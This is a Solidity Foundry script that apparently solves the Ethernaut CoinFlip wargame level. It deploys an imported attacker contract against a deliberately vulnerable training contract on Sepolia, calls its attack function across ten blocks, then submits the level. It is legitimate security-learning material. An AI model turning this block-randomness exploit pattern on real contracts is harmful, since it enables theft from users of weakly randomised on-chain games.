// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {CoinFlipAttacker} from "../../src/03-CoinFlipAttacker.sol";

contract CoinFlipSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    address challengeInstanceOnChain = 0xE17e4fb48D30f247F749a42Ab35E8465C1ac4732; // Change this address into yours after step1 executed.
    address coinFlipAttackerAddress = 0x38eddcE71f8d83eBEfe41bEA8EEdb40d8A6e9b93; // Change this address into yours after step1 executed.

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE 
        CoinFlipAttacker coinFlipAttacker = new CoinFlipAttacker(challengeInstance);
        uint256 height = 100;
        vm.roll(height);

        for (uint i = 0; i < 10; i++) {
            vm.roll(height + i);
            console2.log(block.number);
            coinFlipAttacker.attack();
        }

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(3));
    }

    /**
     * Execute 1 time.
     * Deployed challengeInstance and coinFlipAttacker contracts on Sepolia, then executed attack() function once.
     * Ex. forge script ... ... --sig "step1()" --broadcast
     */
    function step1() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);
        console2.log("challengeInstanceOnChain:", challengeInstance);

        // YOUR SOLUTION HERE 
        CoinFlipAttacker coinFlipAttacker = new CoinFlipAttacker(challengeInstance);
        console2.log("coinFlipAttackerAddress:", address(coinFlipAttacker));

        console2.log("block.number:", block.number);
        coinFlipAttacker.attack();

        vm.stopBroadcast();

        console2.log(successMessage(3));
    }

    /**
     * Execute 9 times.
     * Executed attack() function.
     * Ex. forge script ... ... --sig "step2()" --broadcast
     */
    function step2() public {
        vm.startBroadcast(heroPrivateKey);

        console2.log("block.number:", block.number);
        CoinFlipAttacker(coinFlipAttackerAddress).attack();

        vm.stopBroadcast();

        console2.log(successMessage(3));
    }

    /**
     * Execute 1 time.
     * Submitted challengeInstance.
     * Ex. forge script ... ... --sig "step3()" --broadcast
     */
    function step3() public {
        vm.startBroadcast(heroPrivateKey);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstanceOnChain);
        require(levelSuccess, "Challenge not passed yet");

        vm.stopBroadcast();

        console2.log(successMessage(3));
    }
}
